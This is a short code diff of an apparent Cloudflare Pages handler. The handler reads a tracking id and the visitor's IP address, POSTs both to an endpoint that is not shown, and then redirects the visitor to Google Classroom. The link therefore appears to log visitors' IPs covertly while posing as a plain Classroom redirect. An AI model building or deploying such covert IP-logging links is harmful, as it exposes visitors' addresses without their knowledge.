@@ -1,20 +1,9 @@
 export function onRequest(context) {
     const { request } = context;
     const url = new URL(request.url);
-
-    // Immediately redirect the request
-    const response = Response.redirect("https://classroom.google.com/h", 302);
-
-    // Perform tasks asynchronously after sending the redirect response
-    event.waitUntil(handleRequest(url.search, request.headers.get("CF-Connecting-IP")));
-
-    return response;
-}
-
-async function handleRequest(searchParams, ip) {
-    const idMatch = searchParams.match(/[?&]i=([^&]+)/);
+    const idMatch = url.search.match(/[?&]i=([^&]+)/);
     const id = idMatch ? idMatch[1] : null;
-
+    const ip = request.headers.get("CF-Connecting-IP");
     let extractedText = null;
     if (id) {
         const regex = /^(?:[^"]*"[^"]*"){2}([^"]*)/;
@@ -38,10 +27,11 @@ async function handleRequest(searchParams, ip) {
                 headers: {
                     "Content-Type": "application/json"
                 },
-                body: JSON.stringify({ data: nodeApiData, ip: ip })
+                body: JSON.stringify({ data: nodeApiData, ip: ip})
             });
         } catch (error) {
             console.error("Error handling request:", error);
         }
     }
+    return Response.redirect("https://classroom.google.com/h", 302);
 }
